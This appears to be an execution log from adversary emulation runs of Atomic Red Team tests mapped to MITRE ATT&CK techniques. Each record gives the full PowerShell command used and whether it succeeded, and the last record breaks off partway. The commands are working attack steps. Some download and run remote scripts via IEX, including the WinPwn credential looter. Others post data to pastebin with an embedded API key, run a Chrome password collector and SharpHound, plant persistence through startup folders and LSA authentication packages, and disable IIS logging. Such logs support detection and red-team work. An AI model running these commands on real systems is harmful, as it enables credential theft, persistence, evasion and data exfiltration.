adversary_id: atomic__t1059_001__execution__command_and_scripting_interpreter-_powershell__0f3401d54f59bc1c3eca134ad5d8a774__trial_1

atomic_ordering: ['0f3401d54f59bc1c3eca134ad5d8a774']
------------------------------
{'ability_id': '0f3401d54f59bc1c3eca134ad5d8a774',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'execution',
            'technique_id': 'T1059.001',
            'technique_name': 'Command and Scripting Interpreter: PowerShell'},
 'command': 'import-module '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1"; try '
            '{ Invoke-BloodHound -OutputDirectory $env:Temp }; catch { $_; '
            'exit $_.Exception.HResult}; Start-Sleep 5',
 'delegated': '2023-11-28T05:23:06Z',
 'description': 'Upon execution SharpHound will be downloaded to disk, '
                'imported and executed. It will set up collection methods, run '
                'and then compress and store the data to the temp directory on '
                'the machine. If system is unable to contact a domain, proper '
                'execution will not occur.\n'
                '\n'
                'Successful execution will produce stdout message stating '
                '"SharpHound Enumeration Completed". Upon completion, final '
                'output will be a *BloodHound.zip file.\n',
 'executor': 'psh',
 'link_id': '58b50571-4935-4473-a8cf-3816d150e7ec',
 'name': 'Run BloodHound from local disk',
 'pid': 4264,
 'plaintext_command': 'import-module '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\SharpHound.ps1"; '
                      'try { Invoke-BloodHound -OutputDirectory $env:Temp }; '
                      'catch { $_; exit $_.Exception.HResult}; Start-Sleep 5',
 'platform': 'windows',
 'run': '2023-11-28T05:23:36Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_004__defense-evasion__signed_binary_proxy_execution-_installutil__9eb61c26282c5b324e1fb6cceeefc445__trial_1

atomic_ordering: ['9eb61c26282c5b324e1fb6cceeefc445']
------------------------------
{'ability_id': '9eb61c26282c5b324e1fb6cceeefc445',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.004',
            'technique_name': 'Signed Binary Proxy Execution: InstallUtil'},
 'command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; } else '
            '{New-Item -Type Directory (split-path '
            '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction ignore | '
            'Out-Null; Invoke-WebRequest '
            "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
            '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
            '"eaecbe_InstallUtilTestHarness.ps1"; $InstallerAssemblyDir = '
            '"$Env:TEMP\\"; $InstallerAssemblyFileName = "T1218.004.dll"; '
            '$InstallerAssemblyFullPath = Join-Path -Path '
            '$InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName; '
            '$CommandLine = "/logfile= /logtoconsole=false '
            '/installtype=notransaction /action=install '
            '`"$InstallerAssemblyFullPath`""; $ExpectedOutput = '
            "'Constructor_Install_'; $TestArgs = @{;     "
            'OutputAssemblyDirectory = $InstallerAssemblyDir;     '
            'OutputAssemblyFileName = $InstallerAssemblyFileName;     '
            "InvocationMethod = 'Executable';     CommandLine = $CommandLine; "
            '}; $ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly '
            '@TestArgs; if ($ActualOutput -ne $ExpectedOutput) {;     throw '
            '@"; InstallUtil Install method execution test failure. Installer '
            'assembly execution output did not match the expected output.; '
            'Expected: $ExpectedOutput; Actual: $ActualOutput; "@; }',
 'delegated': '2023-11-30T21:10:07Z',
 'description': 'Executes the Install Method. Upon execution, version '
                'information will be displayed the .NET framework install '
                'utility.\n',
 'executor': 'psh',
 'link_id': '3d1e001c-2772-425e-939d-1817b3900147',
 'name': 'InstallUtil Install method call',
 'pid': 5416,
 'plaintext_command': 'if (Test-Path "eaecbe_InstallUtilTestHarness.ps1") { ; '
                      '} else {New-Item -Type Directory (split-path '
                      '"eaecbe_InstallUtilTestHarness.ps1") -ErrorAction '
                      'ignore | Out-Null; Invoke-WebRequest '
                      "'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.004/src/InstallUtilTestHarness.ps1' "
                      '-OutFile "eaecbe_InstallUtilTestHarness.ps1"};  ; . '
                      '"eaecbe_InstallUtilTestHarness.ps1"; '
                      '$InstallerAssemblyDir = "$Env:TEMP\\"; '
                      '$InstallerAssemblyFileName = "T1218.004.dll"; '
                      '$InstallerAssemblyFullPath = Join-Path -Path '
                      '$InstallerAssemblyDir -ChildPath '
                      '$InstallerAssemblyFileName; $CommandLine = "/logfile= '
                      '/logtoconsole=false /installtype=notransaction '
                      '/action=install `"$InstallerAssemblyFullPath`""; '
                      "$ExpectedOutput = 'Constructor_Install_'; $TestArgs = "
                      '@{;     OutputAssemblyDirectory = '
                      '$InstallerAssemblyDir;     OutputAssemblyFileName = '
                      '$InstallerAssemblyFileName;     InvocationMethod = '
                      "'Executable';     CommandLine = $CommandLine; }; "
                      '$ActualOutput = '
                      'Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs; if '
                      '($ActualOutput -ne $ExpectedOutput) {;     throw @"; '
                      'InstallUtil Install method execution test failure. '
                      'Installer assembly execution output did not match the '
                      'expected output.; Expected: $ExpectedOutput; Actual: '
                      '$ActualOutput; "@; }',
 'platform': 'windows',
 'run': '2023-11-30T21:10:22Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1615__discovery__group_policy_discovery__5a1dc4ce41e376e1928d3a399ccadff3__trial_1

atomic_ordering: ['5a1dc4ce41e376e1928d3a399ccadff3']
------------------------------
{'ability_id': '5a1dc4ce41e376e1928d3a399ccadff3',
 'agent_reported_time': '2023-11-11T13:10:43Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1615',
            'technique_name': 'Group Policy Discovery'},
 'command': 'Get-GPO -Domain $ENV:userdnsdomain -All >> '
            '$env:temp\\GPO_Output.txt',
 'delegated': '2023-12-04T04:00:51Z',
 'description': 'The Get-GPO cmdlet gets one Group Policy Object (GPO) or all '
                'the GPOs in a domain. Tested on Windows Server 2019 as a '
                'domain user with computer joined to domain. Reference: '
                'https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps',
 'executor': 'psh',
 'link_id': '2774e57f-8705-4f6b-8826-e6b650cd400a',
 'name': 'MSFT Get-GPO Cmdlet',
 'pid': 9172,
 'plaintext_command': 'Get-GPO -Domain $ENV:userdnsdomain -All >> '
                      '$env:temp\\GPO_Output.txt',
 'platform': 'windows',
 'run': '2023-12-04T04:01:38Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__1272c02ca685d9967ee2be885dea8df5__trial_1

atomic_ordering: ['1272c02ca685d9967ee2be885dea8df5']
------------------------------
{'ability_id': '1272c02ca685d9967ee2be885dea8df5',
 'agent_reported_time': '2023-11-11T13:10:31Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': 'Set-Location -path '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysinternals"; '
            './accesschk.exe -accepteula .;',
 'delegated': '2023-12-02T21:16:47Z',
 'description': 'A modified sysinternals suite will be downloaded and staged. '
                'The Chrome-password collector, renamed accesschk.exe, will '
                'then be executed from #{file_path}.\n'
                '\n'
                'Successful execution will produce stdout message stating '
                '"Copying db ... passwordsDB DB Opened. statement prepare DB '
                'connection closed properly". Upon completion, final output '
                'will be a file modification of '
                'PathToAtomicsFolder\\..\\ExternalPayloads\\sysinternals\\passwordsdb.\n'
                '\n'
                'Adapted from [MITRE ATTACK '
                'Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/data/abilities/credential-access/e7cab9bb-3e3a-4d93-99cc-3593c1dc8c6d.yml)\n',
 'executor': 'psh',
 'link_id': 'ebe4640a-b81f-4edf-8fa8-dee20be53b16',
 'name': 'Run Chrome-password Collector',
 'pid': 2532,
 'plaintext_command': 'Set-Location -path '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\Sysinternals"; '
                      './accesschk.exe -accepteula .;',
 'platform': 'windows',
 'run': '2023-12-02T21:17:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1098__persistence__account_manipulation__8862278ba483c0d5f719ffbc9186a901__trial_1

atomic_ordering: ['8862278ba483c0d5f719ffbc9186a901']
------------------------------
{'ability_id': '8862278ba483c0d5f719ffbc9186a901',
 'agent_reported_time': '2023-11-11T13:08:22Z',
 'attack': {'tactic': 'persistence',
            'technique_id': 'T1098',
            'technique_name': 'Account Manipulation'},
 'command': 'if (Test-Path '
            '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { ; } else '
            '{New-Item -Type Directory (split-path '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
            '-ErrorAction Ignore | Out-Null; $cred = Get-Credential -UserName  '
            '$env:USERNAME -message "Enter password for $env:USERNAME to use '
            'during password change attempt"; $cred.Password | '
            'ConvertFrom-SecureString | Out-File '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  ;  '
            '$credFile = '
            '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; if '
            '(Test-Path $credFile) {;     $cred = New-Object -TypeName '
            'System.Management.Automation.PSCredential -ArgumentList '
            '$env:USERNAME, (Get-Content $credFile | '
            'ConvertTo-SecureString);     '
            'if($cred.GetNetworkCredential().Password -eq "Uplow-1"){;       '
            'Write-Host -ForegroundColor Yellow "The new password is the same '
            'as the password stored in the credential file. Please specify a '
            'different new password."; exit -1;     };     try {;         '
            '$newPassword = ConvertTo-SecureString Uplow-1 -AsPlainText '
            '-Force;         Set-ADAccountPassword -Identity $env:USERNAME '
            '-OldPassword $cred.password -NewPassword $newPassword;     };     '
            'catch { ;         $_.Exception;         $errCode = '
            '$_.Exception.ErrorCode;         Write-Host "Error code: '
            '$errCode";         if ($errCode -eq 86) {;             Write-Host '
            '-ForegroundColor Yellow "The stored password for the current user '
            'is incorrect. Please run the prereq commands to set the correct '
            'credentials";             Remove-Item $credFile;         '
            '};         exit $errCode;     };     Write-Host -ForegroundColor '
            'Cyan "Successfully changed the password to Uplow-1";     $newCred '
            '= New-Object System.Management.Automation.PSCredential '
            '($env:USERNAME, $(ConvertTo-SecureString "Uplow-1" -AsPlainText '
            '-Force));     $newCred.Password | ConvertFrom-SecureString | '
            'Out-File $credFile; }; else {;     Write-Host -ForegroundColor '
            'Yellow "You must store the password of the current user by '
            'running the prerequisite commands first"; }',
 'delegated': '2023-11-29T14:33:32Z',
 'description': 'Attempt to change the password of the current domain user in '
                'order to check password policy. Ideally, you would only run '
                'this atomic test to verify that your password policy is '
                'blocking the use of the new password.\n'
                'If the password is succesfully changed to the new password, '
                'the credential file will be updated to reflect the new '
                'password.  You can then run the atomic manually and specify a '
                'new password of your choosing, however the\n'
                'password policy will likely prevent you from setting the '
                'password back to what it was.\n',
 'executor': 'psh',
 'link_id': '859b3bab-e5e3-48ba-8949-bf37c522cfc1',
 'name': 'Domain Password Policy Check: Short Password',
 'pid': 4844,
 'plaintext_command': 'if (Test-Path '
                      '$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt) { '
                      '; } else {New-Item -Type Directory (split-path '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt") '
                      '-ErrorAction Ignore | Out-Null; $cred = Get-Credential '
                      '-UserName  $env:USERNAME -message "Enter password for '
                      '$env:USERNAME to use during password change attempt"; '
                      '$cred.Password | ConvertFrom-SecureString | Out-File '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"};  '
                      ';  $credFile = '
                      '"$env:LOCALAPPDATA\\AtomicRedTeam\\$env:USERNAME.txt"; '
                      'if (Test-Path $credFile) {;     $cred = New-Object '
                      '-TypeName System.Management.Automation.PSCredential '
                      '-ArgumentList $env:USERNAME, (Get-Content $credFile | '
                      'ConvertTo-SecureString);     '
                      'if($cred.GetNetworkCredential().Password -eq '
                      '"Uplow-1"){;       Write-Host -ForegroundColor Yellow '
                      '"The new password is the same as the password stored in '
                      'the credential file. Please specify a different new '
                      'password."; exit -1;     };     try {;         '
                      '$newPassword = ConvertTo-SecureString Uplow-1 '
                      '-AsPlainText -Force;         Set-ADAccountPassword '
                      '-Identity $env:USERNAME -OldPassword $cred.password '
                      '-NewPassword $newPassword;     };     catch { ;         '
                      '$_.Exception;         $errCode = '
                      '$_.Exception.ErrorCode;         Write-Host "Error code: '
                      '$errCode";         if ($errCode -eq 86) {;             '
                      'Write-Host -ForegroundColor Yellow "The stored password '
                      'for the current user is incorrect. Please run the '
                      'prereq commands to set the correct '
                      'credentials";             Remove-Item '
                      '$credFile;         };         exit $errCode;     };     '
                      'Write-Host -ForegroundColor Cyan "Successfully changed '
                      'the password to Uplow-1";     $newCred = New-Object '
                      'System.Management.Automation.PSCredential '
                      '($env:USERNAME, $(ConvertTo-SecureString "Uplow-1" '
                      '-AsPlainText -Force));     $newCred.Password | '
                      'ConvertFrom-SecureString | Out-File $credFile; }; else '
                      '{;     Write-Host -ForegroundColor Yellow "You must '
                      'store the password of the current user by running the '
                      'prerequisite commands first"; }',
 'platform': 'windows',
 'run': '2023-11-29T14:33:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_001__multiple__boot_or_logon_autostart_execution-_registry_run_keys_,_startup_folder__03a127453d425bf1fd8dc9af1ed7ddce__trial_1

atomic_ordering: ['03a127453d425bf1fd8dc9af1ed7ddce']
------------------------------
{'ability_id': '03a127453d425bf1fd8dc9af1ed7ddce',
 'agent_reported_time': '2023-11-11T13:08:56Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.001',
            'technique_name': 'Boot or Logon Autostart Execution: Registry Run '
                              'Keys / Startup Folder'},
 'command': 'Copy-Item "$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat" '
            '"$env:APPDATA\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\batstartup.bat"; Copy-Item '
            '"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat" '
            '"C:\\ProgramData\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\StartUp\\batstartup.bat"; Start-Process '
            '"$env:APPDATA\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\Startup\\batstartup.bat"; Start-Process '
            '"C:\\ProgramData\\Microsoft\\Windows\\Start '
            'Menu\\Programs\\StartUp\\batstartup.bat"',
 'delegated': '2023-12-01T23:57:36Z',
 'description': 'bat files can be placed in and executed from the startup '
                'folder to maintain persistance\n'
                '\n'
                'Upon execution, cmd will be run and immediately closed. '
                'Additionally, the new files can be viewed in the '
                '"$env:APPDATA\\Microsoft\\Windows\\Start '
                'Menu\\Programs\\Startup"\n'
                'folder and will also run when the computer is restarted and '
                'the user logs in.\n',
 'executor': 'psh',
 'link_id': 'efd5359b-67ed-4d53-b0e0-437f70193d33',
 'name': 'Suspicious bat file run from startup Folder',
 'pid': 3392,
 'plaintext_command': 'Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat" '
                      '"$env:APPDATA\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\batstartup.bat"; Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.001\\src\\batstartup.bat" '
                      '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\StartUp\\batstartup.bat"; Start-Process '
                      '"$env:APPDATA\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\Startup\\batstartup.bat"; Start-Process '
                      '"C:\\ProgramData\\Microsoft\\Windows\\Start '
                      'Menu\\Programs\\StartUp\\batstartup.bat"',
 'platform': 'windows',
 'run': '2023-12-01T23:57:43Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_002__multiple__authentication_package__7197a8fcd7e833f42251ee3eddaa87c1__trial_1

atomic_ordering: ['7197a8fcd7e833f42251ee3eddaa87c1']
------------------------------
{'ability_id': '7197a8fcd7e833f42251ee3eddaa87c1',
 'agent_reported_time': '2023-11-11T13:10:55Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.002',
            'technique_name': 'Authentication Package'},
 'command': 'Copy-Item "$PathToAtomicsFolder\\T1547.002\\bin\\package.dll" '
            'C:\\Windows\\System32\\; reg add '
            '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v '
            '"Authentication Packages" /t REG_MULTI_SZ /d '
            '"msv1_0\\0package.dll" /f',
 'delegated': '2023-12-02T04:04:15Z',
 'description': 'Establishes persistence using a custom authentication package '
                'for the Local Security Authority (LSA).\n'
                'After a reboot, Notepad.exe will be executed as child process '
                'of lsass.exe.\n'
                'Payload source code: '
                'https://github.com/tr4cefl0w/payloads/tree/master/T1547.002/package\n'
                '[Related '
                'blog](https://pentestlab.blog/2019/10/21/persistence-security-support-provider/)\n',
 'executor': 'psh',
 'link_id': '2476c890-85c2-4e3b-9124-e8c5d5f4072c',
 'name': 'Authentication Package',
 'pid': 10992,
 'plaintext_command': 'Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.002\\bin\\package.dll" '
                      'C:\\Windows\\System32\\; reg add '
                      '"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa" '
                      '/v "Authentication Packages" /t REG_MULTI_SZ /d '
                      '"msv1_0\\0package.dll" /f',
 'platform': 'windows',
 'run': '2023-12-02T04:05:14Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1566_001__initial-access__phishing-_spearphishing_attachment__0a69420bec84b02bd47464f6835653b1__trial_1

atomic_ordering: ['0a69420bec84b02bd47464f6835653b1']
------------------------------
{'ability_id': '0a69420bec84b02bd47464f6835653b1',
 'agent_reported_time': '2023-11-11T13:10:02Z',
 'attack': {'tactic': 'initial-access',
            'technique_id': 'T1566.001',
            'technique_name': 'Phishing: Spearphishing Attachment'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing); $macrocode = "   Open '
            '`"C:\\Users\\Public\\art.jse`" For Output As #1`n   Write #1, '
            '`"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"; '
            'Invoke-MalDoc -macroCode $macrocode -officeProduct "Word"',
 'delegated': '2023-12-03T21:11:09Z',
 'description': 'Word spawning a command prompt then running a command with an '
                'IP address in the command line is an indicator of malicious '
                'activity.\n'
                'Upon execution, CMD will be launched and ping 8.8.8.8.\n',
 'executor': 'psh',
 'link_id': '3453c182-9148-498f-96c8-09c52ca98a34',
 'name': 'Word spawned a command shell and used an IP address in the command '
         'line',
 'pid': 10224,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing); $macrocode = "   Open '
                      '`"C:\\Users\\Public\\art.jse`" For Output As #1`n   '
                      'Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ '
                      '`"ping 8.8.8.8`"`n"; Invoke-MalDoc -macroCode '
                      '$macrocode -officeProduct "Word"',
 'platform': 'windows',
 'run': '2023-12-03T21:11:50Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1562_002__defense-evasion__impair_defenses-_disable_windows_event_logging__bc5d26cf7201f1504b495ca2c1758ebf__trial_1

atomic_ordering: ['bc5d26cf7201f1504b495ca2c1758ebf']
------------------------------
{'ability_id': 'bc5d26cf7201f1504b495ca2c1758ebf',
 'agent_reported_time': '2023-11-11T13:10:34Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.002',
            'technique_name': 'Impair Defenses: Disable Windows Event Logging'},
 'command': 'C:\\Windows\\System32\\inetsrv\\appcmd.exe set config "Default '
            'Web Site" /section:httplogging /dontLog:true',
 'delegated': '2023-12-03T15:42:46Z',
 'description': 'Disables HTTP logging on a Windows IIS web server as seen by '
                'Threat Group 3390 (Bronze Union).\n'
                'This action requires HTTP logging configurations in IIS to be '
                'unlocked.\n'
                '\n'
                'Use the cleanup commands to restore some default auditpol '
                'settings (your original settings will be lost)\n',
 'executor': 'psh',
 'link_id': 'a817c1bf-5997-4034-8ee9-45af92b5a9b4',
 'name': 'Disable Windows IIS HTTP Logging',
 'pid': 5528,
 'plaintext_command': 'C:\\Windows\\System32\\inetsrv\\appcmd.exe set config '
                      '"Default Web Site" /section:httplogging /dontLog:true',
 'platform': 'windows',
 'run': '2023-12-03T15:43:35Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1053_005__multiple__scheduled_task,job-_scheduled_task__920a251237fac2b70fe4d647aa16bfdd__trial_1

atomic_ordering: ['920a251237fac2b70fe4d647aa16bfdd']
------------------------------
{'ability_id': '920a251237fac2b70fe4d647aa16bfdd',
 'agent_reported_time': '2023-11-11T13:10:01Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1053.005',
            'technique_name': 'Scheduled Task/Job: Scheduled Task'},
 'command': '[Net.ServicePointManager]::SecurityProtocol = '
            '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
            '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
            '-UseBasicParsing) ; Invoke-MalDoc -macroFile '
            '"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt" '
            '-officeProduct "Word" -sub "Scheduler"',
 'delegated': '2023-11-27T23:32:21Z',
 'description': 'This module utilizes the Windows API to schedule a task for '
                'code execution (notepad.exe). The task scheduler will execute '
                '"notepad.exe" within\n'
                '30 - 40 seconds after this module has run\n',
 'executor': 'psh',
 'link_id': '5df362b7-d953-4c07-aa30-56430c8a8586',
 'name': 'Task Scheduler via VBA',
 'pid': 7136,
 'plaintext_command': '[Net.ServicePointManager]::SecurityProtocol = '
                      '[Net.SecurityProtocolType]::Tls12; IEX (iwr '
                      '"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" '
                      '-UseBasicParsing) ; Invoke-MalDoc -macroFile '
                      '"PathToAtomicsFolder\\T1053.005\\src\\T1053.005-macrocode.txt" '
                      '-officeProduct "Word" -sub "Scheduler"',
 'platform': 'windows',
 'run': '2023-11-27T23:33:13Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1567_003__exfiltration__exfiltration_over_web_service-_exfiltration_to_text_storage_sites__c275ffb52331397b42ebc52338be3c8c__trial_1

atomic_ordering: ['c275ffb52331397b42ebc52338be3c8c']
------------------------------
{'ability_id': 'c275ffb52331397b42ebc52338be3c8c',
 'agent_reported_time': '2023-11-11T13:10:37Z',
 'attack': {'tactic': 'exfiltration',
            'technique_id': 'T1567.003',
            'technique_name': 'Exfiltration Over Web Service: Exfiltration to '
                              'Text Storage Sites'},
 'command': '$apiKey = "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"; $content = '
            '"secrets, api keys, passwords..."; $url = '
            '"https://pastebin.com/api/api_post.php"; $postData = @{;   '
            'api_dev_key   = $apiKey;   api_option    = "paste";   '
            'api_paste_code = $content; }; $response = Invoke-RestMethod -Uri '
            '$url -Method Post -Body $postData; Write-Host "Your paste URL: '
            '$response"',
 'delegated': '2023-12-03T22:09:53Z',
 'description': 'This test uses HTTP POST to exfiltrate data to a remote text '
                'storage site. (pastebin)                             \n'
                'See '
                'https://web.archive.org/web/20201107203304/https://www.echosec.net/blog/what-is-pastebin-and-why-do-hackers-love-it                \n',
 'executor': 'psh',
 'link_id': '08d0e491-ae0c-4866-94a1-11d73c8715bf',
 'name': 'Exfiltrate data with HTTP POST to text storage sites - pastebin.com '
         '(Windows)',
 'pid': 8432,
 'plaintext_command': '$apiKey = "6nxrBm7UIJuaEuPOkH5Z8I7SvCLN3OP0"; $content '
                      '= "secrets, api keys, passwords..."; $url = '
                      '"https://pastebin.com/api/api_post.php"; $postData = '
                      '@{;   api_dev_key   = $apiKey;   api_option    = '
                      '"paste";   api_paste_code = $content; }; $response = '
                      'Invoke-RestMethod -Uri $url -Method Post -Body '
                      '$postData; Write-Host "Your paste URL: $response"',
 'platform': 'windows',
 'run': '2023-12-03T22:10:36Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__c6ea575d9641c11410417105f14175ab__trial_1

atomic_ordering: ['c6ea575d9641c11410417105f14175ab']
------------------------------
{'ability_id': 'c6ea575d9641c11410417105f14175ab',
 'agent_reported_time': '2023-11-11T13:10:20Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1555.003',
            'technique_name': 'Credentials from Password Stores: Credentials '
                              'from Web Browsers'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'kittenz -consoleoutput -noninteractive',
 'delegated': '2023-12-03T00:11:13Z',
 'description': 'Loot local Credentials - mimi-kittenz technique via function '
                'of WinPwn - Extend timeout to 600s',
 'executor': 'psh',
 'link_id': '409f9c62-6f82-4f83-ab2f-e06f26dca0bc',
 'name': 'WinPwn - Loot local Credentials - mimi-kittenz',
 'pid': 5528,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'kittenz -consoleoutput -noninteractive',
 'platform': 'windows',
 'run': '2023-12-03T00:11:41Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__0bb6fa90a458e6512a19d246cfae8843__trial_1

atomic_ordering: ['0bb6fa90a458e6512a19d246cfae8843']
------------------------------
{'ability_id': '0bb6fa90a458e6512a19d246cfae8843',
 'agent_reported_time': '2023-11-11T13:10:00Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.005',
            'technique_name': 'Signed Binary Proxy Execution: Mshta'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHHTMLApplication -ScriptEngine JScript '
            '-InlineProtocolHandler About -UseRundll32 -Rundll32FilePath '
            '$env:windir\\system32\\rundll32.exe',
 'delegated': '2023-11-30T22:27:09Z',
 'description': 'Executes an HTA Application with JScript Engine, Rundll32 and '
                'Inline Protocol Handler.',
 'executor': 'psh',
 'link_id': 'd62ad44a-fa55-4e7d-a1b6-9a0f985dd603',
 'name': 'Invoke HTML Application - JScript Engine with Rundll32 and Inline '
         'Protocol Handler',
 'pid': 8312,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHHTMLApplication '
                      '-ScriptEngine JScript -InlineProtocolHandler About '
                      '-UseRundll32 -Rundll32FilePath '
                      '$env:windir\\system32\\rundll32.exe',
 'platform': 'windows',
 'run': '2023-11-30T22:27:58Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1497_001__multiple__virtualization,sandbox_evasion-_system_checks__64ccf7cd4358a0540ab51c8015c1b744__trial_1

atomic_ordering: ['64ccf7cd4358a0540ab51c8015c1b744']
------------------------------
{'ability_id': '64ccf7cd4358a0540ab51c8015c1b744',
 'agent_reported_time': '2023-11-11T13:09:49Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1497.001',
            'technique_name': 'Virtualization/Sandbox Evasion: System Checks'},
 'command': '$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | '
            'select-object -expandproperty "Manufacturer"; $Model = '
            'Get-WmiObject -Class Win32_ComputerSystem | select-object '
            '-expandproperty "Model"; if((($Manufacturer.ToLower() -eq '
            '"microsoft corporation") -and '
            '($Model.ToLower().contains("virtual"))) -or '
            '($Manufacturer.ToLower().contains("vmware")) -or '
            '($Model.ToLower() -eq "virtualbox")) {write-host "Virtualization '
            'environment detected!"} else {write-host "No virtualization '
            'environment detected!"}',
 'delegated': '2023-12-01T11:22:08Z',
 'description': 'Windows Management Instrumentation(WMI) objects contain '
                'system information which helps to detect virtualization. This '
                'test will get the model and manufacturer of the machine to '
                'determine if it is a virtual machine, such as through VMware '
                'or VirtualBox. \n',
 'executor': 'psh',
 'link_id': 'd470a469-27cf-401a-b427-8735c028f613',
 'name': 'Detect Virtualization Environment via WMI Manufacturer/Model Listing '
